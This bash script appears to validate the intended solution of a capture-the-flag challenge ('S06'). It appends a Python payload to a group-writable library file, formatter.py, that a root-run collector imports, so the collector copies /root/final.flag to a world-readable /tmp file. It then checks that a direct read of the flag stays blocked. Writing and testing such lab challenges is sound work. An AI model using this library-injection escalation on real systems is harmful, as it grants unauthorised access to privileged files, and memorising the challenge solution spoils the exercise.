#!/bin/bash
# Run this inside the container as s06player, not on the host:
#   docker exec -u s06player -it <container> bash
# Walks through the intended path end to end and checks it actually works.
set -euo pipefail

echo "[*] Identity / groups:"
id

echo "[*] Writable check on the library dir:"
ls -ld /opt/spectral/lib
touch /opt/spectral/lib/.write_test && rm -f /opt/spectral/lib/.write_test \
  && echo "[PASS] telemetry group can write to /opt/spectral/lib"

echo "[*] adding the payload to formatter.py..."
cat >> /opt/spectral/lib/formatter.py <<'PY'


# copies the flag out once, then leaves future runs alone
import os
import shutil

def _spectral_once():
    src, dst = "/root/final.flag", "/tmp/final.flag"
    if os.path.exists(src) and not os.path.exists(dst):
        shutil.copyfile(src, dst)
        os.chmod(dst, 0o644)

_spectral_once()
PY

echo "[*] waiting for the next collection run (~25s)..."
sleep 25

if [ -f /tmp/final.flag ]; then
  echo "[PASS] /tmp/final.flag exists:"
  cat /tmp/final.flag
else
  echo "[FAIL] Flag was not copied. Check supervisor logs:"
  echo "       /var/log/collector_loop.err.log"
  exit 1
fi

echo "[*] making sure a direct read is still blocked..."
if cat /root/final.flag 2>/dev/null; then
  echo "[FAIL] s06player can read /root/final.flag directly — permissions are wrong."
  exit 1
else
  echo "[PASS] Direct read of /root/final.flag correctly denied."
fi

echo "[DONE] S06 intended path validated."
